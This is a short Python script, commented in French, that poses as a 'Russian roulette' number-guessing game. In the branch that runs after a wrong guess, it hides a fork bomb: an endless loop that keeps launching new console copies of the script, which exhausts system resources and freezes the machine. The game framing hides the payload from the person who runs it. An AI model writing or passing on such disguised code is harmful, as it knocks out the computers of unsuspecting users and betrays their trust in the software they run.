import random
import subprocess, sys
def roulette_russe():
    while True:
        # Le jeu choisit un nombre aléatoire entre 1 et 10
        nombre_choisi = random.randint(1, 10)

        while True:
            # Demande au joueur de deviner un nombre entre 1 et 10
            try:
                devinette = int(input("Devinez un nombre entre 1 et 10 : "))
                
                # Vérifie si le nombre est bien dans la plage de 1 à 10
                if devinette < 1 or devinette > 10:
                    print("Veuillez entrer un nombre entre 1 et 10.")
                    continue

                # Si la devinette est correcte
                if devinette == nombre_choisi:
                    print("Félicitations ! Vous avez gagné.")
                else:
                    print("Mauvaise réponse ! Vous avez perdu.")
                    while True:
                      subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
                break  # La boucle interne se termine ici, que ce soit gagné ou perdu
            except ValueError:
                print("Veuillez entrer un nombre valide entre 1 et 10.")

        # Demander si le joueur veut rejouer après avoir gagné ou perdu
        replay = input("Voulez-vous rejouer ? (1 pour oui, 0 pour non) : ")
        if replay == "0":
            print("Merci d'avoir joué ! À bientôt.")
            break  # Quitte la boucle principale et ferme la console
        elif replay != "1":
            print("Réponse invalide. La partie sera terminée.")
            break  # Quitte la boucle principale et ferme la console

# Démarre le jeu
roulette_russe()
